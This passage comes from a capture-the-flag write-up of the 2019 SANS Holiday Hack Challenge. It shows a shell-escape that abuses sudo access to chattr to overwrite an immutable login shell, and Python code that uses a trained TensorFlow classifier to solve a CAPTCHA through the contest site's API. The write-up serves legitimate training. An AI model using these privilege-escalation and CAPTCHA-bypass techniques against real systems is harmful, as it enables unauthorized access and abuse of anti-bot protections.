&lt;span class="go"&gt;Run commands, win, and done!&lt;/span&gt;

&lt;span class="go"&gt;Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.&lt;/span&gt;

&lt;span class="go"&gt;Target Credentials:&lt;/span&gt;

&lt;span class="go"&gt;username: alabaster_snowball&lt;/span&gt;
&lt;span class="go"&gt;password: Password2&lt;/span&gt;
&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We're given his credentials. Let's use the regular way to switch user context
with the &lt;code&gt;su&lt;/code&gt; binary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; su alabaster_snowball
&lt;span class="go"&gt;Password:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aaaaand of course we're greeted by the nyancat.&lt;/p&gt;
&lt;img alt="nyanshell.png" class="align-center" src="/images/sans-christmas-challenge-2019/nyanshell.png" /&gt;
&lt;p&gt;Alright, let's take a look at Alabaster's shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; grep alabaster_snowball /etc/passwd
&lt;span class="go"&gt;alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh&lt;/span&gt;
&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; ls -lh /bin/nsh
&lt;span class="go"&gt;-rwxrwxrwx 1 root root 74K Dec 11 17:40 /bin/nsh&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So Alabaster's shell is &lt;code&gt;/bin/nsh&lt;/code&gt;. The binary appears to be writeable by
anyone. So if we replace &lt;code&gt;/bin/nsh&lt;/code&gt; by another binary,
say &lt;code&gt;/bin/bash&lt;/code&gt;, we can drop into the correct prompt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; cp /bin/bash /bin/nsh
&lt;span class="go"&gt;cp: cannot create regular file &amp;#39;/bin/nsh&amp;#39;: Operation not permitted&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, it didn't work. Even if the file is &lt;code&gt;chmod 777&lt;/code&gt;, we can't modify it.
This looks like its &lt;a class="reference external" href="https://wiki.archlinux.org/index.php/File_permissions_and_attributes#File_attributes"&gt;attributes&lt;/a&gt;
were modified:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; lsattr /bin/nsh
&lt;span class="go"&gt;----i---------e---- /bin/nsh&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Indeed, the &lt;code&gt;i&lt;/code&gt; flag means that the file is &lt;strong&gt;immutable&lt;/strong&gt;. As the
&lt;code&gt;elf&lt;/code&gt; user, we can't modify &lt;code&gt;/bin/nsh&lt;/code&gt;'s attributes, because it
belongs to &lt;code&gt;root&lt;/code&gt;. Can we execute command as &lt;code&gt;root&lt;/code&gt;? Let's take a
look at our &lt;code&gt;sudo&lt;/code&gt; abilities:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; sudo -l
&lt;span class="go"&gt;Matching Defaults entries for elf on af7e11560ac9:&lt;/span&gt;
&lt;span class="go"&gt;    env_reset, mail_badpass,&lt;/span&gt;
&lt;span class="go"&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;

&lt;span class="go"&gt;User elf may run the following commands on af7e11560ac9:&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;    (root) NOPASSWD: /usr/bin/chattr&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes, we can run &lt;code&gt;chattr&lt;/code&gt;, which allows us to remove the immutable file
from &lt;code&gt;/bin/nsh&lt;/code&gt;, and then modify its content:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; sudo chattr -i /bin/nsh
&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; lsattr /bin/nsh
&lt;span class="go"&gt;--------------e---- /bin/nsh&lt;/span&gt;
&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; cp /bin/bash /bin/nsh
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can now log into Alabaster's account, which will drop us into a &lt;code&gt;bash&lt;/code&gt;
prompt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@af7e11560ac9:~$&lt;/span&gt; su alabaster_snowball
&lt;span class="go"&gt;Password:&lt;/span&gt;
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;



&lt;span class="go"&gt;You did it! Congratulations!&lt;/span&gt;

&lt;span class="gp"&gt;alabaster_snowball@af7e11560ac9:/home/elf$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="bypassing-the-frido-sleigh-capteha"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id30"&gt;Bypassing the Frido Sleigh CAPTEHA&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;So, Krampus wants us to help him win the &lt;a class="reference external" href="https://fridosleigh.com/"&gt;Frido Sleigh&lt;/a&gt;
contest. But to do so, we need to bypass the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/CAPTCHA"&gt;CAPTEHA&lt;/a&gt;,
or &amp;quot;Completely Automated Public Turing test to tell Elves and Humans Apart&amp;quot;.
You see, only elves can enter the contest.&lt;/p&gt;
&lt;img alt="capteha_fail.gif" class="align-center" src="/images/sans-christmas-challenge-2019/capteha_fail.gif" /&gt;
&lt;p&gt;As you can see, the CAPTEHA is pretty hard. We're given 100 images, and we have
five seconds to select every image from three categories. Feasible for an elf,
but not a human.&lt;/p&gt;
&lt;p&gt;Luckily, Krampus gave us an archive of &lt;a class="reference external" href="https://downloads.elfu.org/capteha_images.tar.gz"&gt;12,000 images&lt;/a&gt;
that are properly categorized, and a &lt;a class="reference external" href="/docs/sans-christmas-challenge-2019/capteha_api.py"&gt;Python script&lt;/a&gt;
to interact with the website API. We can use these images to create a Machine
Learning model, so that our Python script can answer the CAPTEHA in our place.&lt;/p&gt;
&lt;p&gt;Now, I don't know anything about Machine Learning. Luckily, there's a
&lt;a class="reference external" href="https://www.youtube.com/watch?v=jmVPLwjm_zs"&gt;conference on the subject&lt;/a&gt;
right here at KringleCon! Be sure to give it a look, it's pretty interesting.&lt;/p&gt;
&lt;p&gt;As Chris suggests in his talk, I'm going to use &lt;a class="reference external" href="https://www.tensorflow.org/"&gt;TensorFlow&lt;/a&gt;
to create a model to solve our CAPTEHA. I was first going to use the &lt;a class="reference external" href="https://github.com/tensorflow/hub/tree/master/examples/image_retraining"&gt;retrain.py&lt;/a&gt;
mentioned in the talk, however, it seems to have been deprecated in favor of
&lt;a class="reference external" href="https://github.com/tensorflow/hub/tree/master/tensorflow_hub/tools/make_image_classifier"&gt;make_image_classifier&lt;/a&gt;.
So let's use this script instead:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; make_image_classifier --image_dir ./capteha_images --tfhub_module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 --saved_model_dir capteha_model --labels_output_file capteha_labels.txt --tflite_output_file capteha_lite_model --batch_size &lt;span class="m"&gt;16&lt;/span&gt;
&lt;span class="go"&gt;I1231 13:03:54.815997 140094772307776 resolver.py:79] Using /tmp/tfhub_modules to cache modules.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 13:03:55.051043: I tensorflow/core/platform/cpu_feature_guard.cc:142] Your CPU supports instructions that this TensorFlow binary was not compiled to use: AVX2 FMA&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 13:03:55.086432: I tensorflow/core/platform/profile_utils/cpu_utils.cc:94] CPU Frequency: 1992000000 Hz&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 13:03:55.088571: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x446a880 executing computations on platform Host. Devices:&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 13:03:55.088742: I tensorflow/compiler/xla/service/service.cc:175]   StreamExecutor device (0): Host, Default Version&lt;/span&gt;
&lt;span class="go"&gt;Using module https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4 with image size (224, 224)&lt;/span&gt;
&lt;span class="go"&gt;Found 2394 images belonging to 6 classes.&lt;/span&gt;
&lt;span class="go"&gt;Found 9582 images belonging to 6 classes.&lt;/span&gt;
&lt;span class="go"&gt;Found 6 classes: Candy Canes, Christmas Trees, Ornaments, Presents, Santa Hats, Stockings&lt;/span&gt;
&lt;span class="go"&gt;Model: &amp;quot;sequential&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;_________________________________________________________________&lt;/span&gt;
&lt;span class="go"&gt;Layer (type)                 Output Shape              Param #&lt;/span&gt;
&lt;span class="go"&gt;=================================================================&lt;/span&gt;
&lt;span class="go"&gt;keras_layer (KerasLayer)     multiple                  2257984&lt;/span&gt;
&lt;span class="go"&gt;_________________________________________________________________&lt;/span&gt;
&lt;span class="go"&gt;dropout (Dropout)            multiple                  0&lt;/span&gt;
&lt;span class="go"&gt;_________________________________________________________________&lt;/span&gt;
&lt;span class="go"&gt;dense (Dense)                multiple                  7686&lt;/span&gt;
&lt;span class="go"&gt;=================================================================&lt;/span&gt;
&lt;span class="go"&gt;Total params: 2,265,670&lt;/span&gt;
&lt;span class="go"&gt;Trainable params: 7,686&lt;/span&gt;
&lt;span class="go"&gt;Non-trainable params: 2,257,984&lt;/span&gt;
&lt;span class="go"&gt;_________________________________________________________________&lt;/span&gt;
&lt;span class="go"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;Epoch 1/5&lt;/span&gt;
&lt;span class="go"&gt;598/598 [==============================] - 1073s 2s/step - loss: 0.5153 - accuracy: 0.9392 - val_loss: 0.4479 - val_accuracy: 0.9996&lt;/span&gt;
&lt;span class="go"&gt;Epoch 2/5&lt;/span&gt;
&lt;span class="go"&gt;598/598 [==============================] - 1071s 2s/step - loss: 0.4573 - accuracy: 0.9995 - val_loss: 0.4402 - val_accuracy: 0.9996&lt;/span&gt;
&lt;span class="go"&gt;Epoch 3/5&lt;/span&gt;
&lt;span class="go"&gt;598/598 [==============================] - 1075s 2s/step - loss: 0.4487 - accuracy: 1.0000 - val_loss: 0.4376 - val_accuracy: 0.9996&lt;/span&gt;
&lt;span class="go"&gt;Epoch 4/5&lt;/span&gt;
&lt;span class="go"&gt;598/598 [==============================] - 1076s 2s/step - loss: 0.4450 - accuracy: 1.0000 - val_loss: 0.4354 - val_accuracy: 0.9996&lt;/span&gt;
&lt;span class="go"&gt;Epoch 5/5&lt;/span&gt;
&lt;span class="go"&gt;598/598 [==============================] - 1081s 2s/step - loss: 0.4423 - accuracy: 1.0000 - val_loss: 0.4343 - val_accuracy: 0.9996&lt;/span&gt;
&lt;span class="go"&gt;Done with training.&lt;/span&gt;
&lt;span class="go"&gt;Labels written to capteha_labels.txt&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:36.474227: W tensorflow/python/util/util.cc:299] Sets are not currently considered sequences, but this may change in the future, so consider avoiding using them.&lt;/span&gt;
&lt;span class="go"&gt;WARNING:tensorflow:From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.&lt;/span&gt;
&lt;span class="go"&gt;Instructions for updating:&lt;/span&gt;
&lt;span class="go"&gt;If using Keras pass *_constraint arguments to layers.&lt;/span&gt;
&lt;span class="go"&gt;W1231 14:33:37.121725 140094772307776 deprecation.py:506] From /home/user/venv/tensorflow/lib/python3.6/site-packages/tensorflow_core/python/ops/resource_variable_ops.py:1781: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.&lt;/span&gt;
&lt;span class="go"&gt;Instructions for updating:&lt;/span&gt;
&lt;span class="go"&gt;If using Keras pass *_constraint arguments to layers.&lt;/span&gt;
&lt;span class="go"&gt;INFO:tensorflow:Assets written to: capteha_model/assets&lt;/span&gt;
&lt;span class="go"&gt;I1231 14:33:38.405297 140094772307776 builder_impl.py:771] Assets written to: capteha_model/assets&lt;/span&gt;
&lt;span class="go"&gt;SavedModel model exported to capteha_model&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:39.668104: W tensorflow/core/graph/graph_constructor.cc:761] Node &amp;#39;StatefulPartitionedCall&amp;#39; has 71 outputs but the _output_shapes attribute specifies shapes for 605 outputs. Output shapes may be inaccurate.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:41.580706: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count &amp;gt;= 8, compute capability &amp;gt;= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:41.580786: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:41.672872: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:41.672907: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: Graph size after: 1905 nodes (1640), 3234 edges (2969), time = 43.177ms.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:41.672913: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   function_optimizer: function_optimizer did nothing. time = 0.76ms.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:42.822924: I tensorflow/core/grappler/devices.cc:60] Number of eligible GPUs (core count &amp;gt;= 8, compute capability &amp;gt;= 0.0): 0 (Note: TensorFlow was not compiled with CUDA support)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:42.823025: I tensorflow/core/grappler/clusters/single_machine.cc:356] Starting new session&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:43.046835: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:716] Optimization results for grappler item: graph_to_optimize&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:43.046868: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (-1042), 1855 edges (-1304), time = 156.762ms.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-31 14:33:43.046878: I tensorflow/core/grappler/optimizers/meta_optimizer.cc:718]   constant folding: Graph size after: 790 nodes (0), 1855 edges (0), time = 26.732ms.&lt;/span&gt;
&lt;span class="go"&gt;TFLite model exported to capteha_lite_model&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I pretty much ran the tool with default parameters, as described in the README.
I did change the &lt;code&gt;--batch_size&lt;/code&gt; argument to 16, instead of the default of
32, because the program consumed to much RAM and kept crashing. It was still
pretty close to total RAM consumption with these parameters. I left the program
running on my laptop for about 1h30, without any other programs running, and it
generated my model.&lt;/p&gt;
&lt;p&gt;Now that we have our model, we need to call it in our &lt;code&gt;capteha_api.py&lt;/code&gt;
file to categorize our different images. I took example on TensorFlow's own
&lt;a class="reference external" href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/python/label_image.py"&gt;label_image.py&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So here's the functions I created:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_labels&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;This functions load our different image categories (Candy Canes,&lt;/span&gt;
&lt;span class="sd"&gt;    Christmas Trees, Ornaments, Presents, Santa Hats, and  Stockings)&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readlines&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;image_from_b64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;This function creates and image object from the base64 value sent by&lt;/span&gt;
&lt;span class="sd"&gt;    the Frido Sleigh server&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;img_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b64_image&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Image&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BytesIO&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img_data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;categorize_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;This function takes an image and our machine learning model, and&lt;/span&gt;
&lt;span class="sd"&gt;    returns the label that matches the image the most&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;input_details&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_input_details&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;output_details&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_output_details&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;input_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expand_dims&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;axis&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;input_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;float32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;input_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mf"&gt;127.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mf"&gt;127.5&lt;/span&gt;

    &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_tensor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;input_details&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;input_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;invoke&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;output_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_tensor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_details&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;squeeze&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;top_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argsort&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;top_result&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;yourREALemailAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;you_should_put_your_real_mail@here.com&amp;gt;&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# Preparing Tensorflow information. Since it takes some time to load,&lt;/span&gt;
    &lt;span class="c1"&gt;# we load it before calling the API.&lt;/span&gt;
    &lt;span class="n"&gt;labels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;load_labels&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./capteha_labels.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;interpreter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lite&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Interpreter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;model_path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./capteha_lite_model&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;interpreter&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;allocate_tensors&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# Creating a session to handle cookies&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;https://fridosleigh.com/&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# Getting information from the Frido Seligh website&lt;/span&gt;
    &lt;span class="n"&gt;json_resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{}api/capteha/request&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;b64_images&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;images&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;                    &lt;span class="c1"&gt;# A list of dictionaries eaching containing the keys &amp;#39;base64&amp;#39; and &amp;#39;uuid&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;challenge_image_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json_resp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select_type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;     &lt;span class="c1"&gt;# The Image types the CAPTEHA Challenge is looking for.&lt;/span&gt;
